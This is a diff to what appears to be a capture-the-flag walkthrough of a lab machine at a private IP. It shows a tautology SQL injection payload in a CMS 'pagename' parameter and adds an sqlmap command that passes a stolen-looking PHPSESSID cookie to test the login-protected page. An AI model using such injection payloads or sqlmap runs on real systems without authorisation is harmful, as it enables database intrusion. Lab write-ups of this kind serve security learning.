@@ -252,8 +252,4 @@ http://172.16.1.76/imfadministrator/cms.php?pagename='or 'a'='a':
 Under Construction.
 ```
 
-http://php.net/manual/en/mysqli-result.fetch-row.php
-
-I'm tempted to use sqlmap, but will try to do this by hand.
-
-Here's what I know about the CMS becuase of the error:
+I tried doing this by hand but resorted to using sqlmap. Since you can only access the CMS after logging in, you will need to pass the PHPSESSID through sqlmap: `sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113`
